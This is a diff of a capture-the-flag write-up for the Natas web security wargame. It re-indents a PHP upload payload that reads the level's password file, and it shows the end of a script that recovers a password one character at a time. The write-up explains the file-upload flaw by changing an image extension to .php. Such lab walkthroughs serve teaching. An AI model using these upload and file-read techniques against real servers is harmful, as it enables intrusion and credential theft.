@@ -259,10 +259,9 @@ Submit this payload in the search form.
 5. Another thing to notice is that the .jpg exension is being added in the HTML form, making it editable in the DevTools.
    We can exploit this by creating a PHP script like:
 
-	<?php
-		require "/etc/natas_webpass/natas13";
-
-	?>
+		<?php
+			require "/etc/natas_webpass/natas13";
+		?>
 
 6.  Open `Inspect` option with `Ctrl + Shift + C` and change the script in the HTML form element from `.jpg` to `.php` (`<a href="upload/rand_str.jpg">upload/rand_str.jpg</a>` to `<a href="upload/rand_str.jpg">upload/rand_str.php</a>`). Upload the script to the server now.
 
@@ -531,4 +530,5 @@ while len(seen_password) < 32:
 print("Recovered password:", ''.join(seen_password))
 ```
 This will gradually build the password.
+
 
